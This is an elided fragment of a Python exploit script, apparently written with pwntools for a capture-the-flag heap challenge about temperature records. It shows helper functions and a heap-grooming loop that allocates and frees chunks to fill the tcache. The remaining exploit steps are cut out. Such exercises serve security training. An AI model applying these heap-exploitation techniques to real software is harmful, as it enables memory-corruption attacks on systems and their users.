...
def add_record(size, data):
    ...
    p.sendlineafter(b"Input Temperature:", b"1")
    p.sendlineafter(b"Input Description Size: ", str(size).encode())
    p.sendafter(b"Input Description: ", data)
...
def edit_record(index, size, buffer):
    ...
    p.sendlineafter(b"Input Temperature: ", b"1")
    p.sendlineafter(b"Input Description Size: ", str(size).encode())
    p.sendafter(b"Input Description: ", buffer)
...
while True:
    try:
        ...
        # Initial setup
        for i in range(8):
            add_record(0x100, b"A" * 0x10)
        add_record(0x100, b"B" * 0x10)
        for i in range(8):          
            delete_record(i)
        add_record(0x100, b"C" * 0x10)
